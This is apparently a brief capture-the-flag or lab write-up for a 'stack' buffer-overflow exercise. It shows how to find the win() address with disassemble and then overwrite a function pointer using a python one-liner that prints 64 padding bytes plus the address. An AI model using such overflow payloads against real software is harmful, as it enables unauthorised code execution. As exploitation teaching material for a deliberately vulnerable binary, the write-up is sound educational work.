This stack is pretty the same as 0. We need overwrite "fp" var with `win()` function address `'A' * 64 + 0x0a0d0a0d`

Get win function address:
`disassemble win`

![img_2.png](img_2.png)

Get `fp` variable address in esp:
`disassemble main`

![img_3.png](img_3.png)

Overwrite variable with python: `python -c "print 'A' * 64 + '\x24\x84\x04\x08'"`

![img_4.png](img_4.png)